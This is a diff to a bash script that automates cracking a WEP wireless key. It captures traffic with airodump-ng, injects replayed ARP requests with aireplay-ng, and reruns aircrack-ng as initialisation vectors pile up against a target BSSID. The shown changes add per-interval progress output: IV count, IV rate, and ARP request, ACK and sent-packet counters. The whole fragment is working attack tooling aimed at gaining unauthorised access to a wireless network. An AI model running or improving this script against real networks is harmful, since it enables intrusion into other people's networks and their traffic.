@@ -42,7 +42,7 @@ MODE="active"
 PREFIX="wepcap"
 IV_TARGET=20000          # aircrack is retried each time #Data grows by this much (-t)
 MIN_IVS=5000             # no aircrack attempt until #Data reaches this many IVs
-RETRY_SECS=15            # how often to re-check the capture / re-run aircrack
+RETRY_SECS=3             # seconds between progress lines (airodump rewrites the capture every second)
 
 while getopts ":i:b:c:e:m:o:t:h" opt; do
   case "$opt" in
@@ -117,9 +117,12 @@ else
 fi
 
 # ---- crack loop -----------------------------------------------------------
-echo "[*] Watching #Data and retrying aircrack-ng every ${RETRY_SECS}s..."
+echo "[*] IVs: captured IVs. IV/s: new IVs per second. ARP req: ARP requests captured for replay."
+echo "    ACK: frames the AP acknowledged. TX: frames our card sent."
+echo "[*] Progress every ${RETRY_SECS}s. aircrack-ng tries the key at ${MIN_IVS} IVs, then every ${IV_TARGET} more."
 echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
 last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
+prev_iv=0                # #Data at the last progress line, for the rate
 while true; do
   sleep "$RETRY_SECS"
   CSV="${OUT}-01.csv"
@@ -129,7 +132,11 @@ while true; do
     ivs=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "$CSV")
     ivs=${ivs:-0}
   fi
-  echo "    [#Data ~ ${ivs} IVs]"
+  # Latest ARP replay counters, from the last status line aireplay-ng printed.
+  replay=$(tail -c 4096 "${OUT}-arpreplay.txt" 2>/dev/null | tr '\r' '\n' | grep -a 'got ' | tail -n 1 |
+    sed -E 's/.*got ([0-9]+) ARP requests and ([0-9]+) ACKs\), sent ([0-9]+) packets.*/ARP req \1, ACK \2, TX \3/')
+  echo "    $(date +%H:%M:%S)  IVs ${ivs} (+$(( (ivs - prev_iv) / RETRY_SECS )) IV/s)  ${replay}"
+  prev_iv=$ivs
   # first try once we have a reasonable pile, then again each time #Data grows by IV_TARGET
   if (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
     last_iv=$ivs
